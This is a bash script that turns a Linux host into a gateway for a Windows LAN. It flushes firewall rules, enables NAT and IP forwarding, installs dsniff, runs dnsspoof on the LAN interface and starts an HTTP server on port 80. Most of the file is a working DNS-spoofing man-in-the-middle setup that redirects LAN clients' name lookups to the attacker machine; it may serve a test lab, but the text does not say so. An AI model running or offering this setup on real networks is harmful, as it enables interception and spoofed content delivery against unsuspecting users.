# Modify the following interface
LAN=eth1  # windows LAN
WAN=eth0  # Linux WAN

start_spoof()
{
  #Enable NAT
  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  iptables --table nat --append POSTROUTING --out-interface $WAN -j MASQUERADE
  iptables --append FORWARD --in-interface $LAN -j ACCEPT
  iptables --append FORWARD --out-interface $LAN -j ACCEPT
  
  #Enable kernel forwarding
  sysctl -w net.ipv4.ip_forward=1
  
  #Setup DNS spoofing
  apt-get install dsniff
  dnsspoof -i $LAN &
  
  #Kick off HTTP server
  case "$(python --version 2>&1)" in
    *" 3."*)
      python -m http.server 80
      ;;
    *)
      python -m SimpleHTTPServer 80
      ;;
  esac
}

stop_spoof()
{
  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  
  sysctl -w net.ipv4.ip_forward=0

  if [ "$(pgrep dnsspoof)" != "" ]; then
    kill $(pgrep dnsspoof)
  fi
}

case "$1" in
  start)
    start_spoof
    ;;
  stop)
    stop_spoof
    ;;
  *)
    echo "Usage: $0 {start|stop}" >&2
    exit 1
    ;;
esac

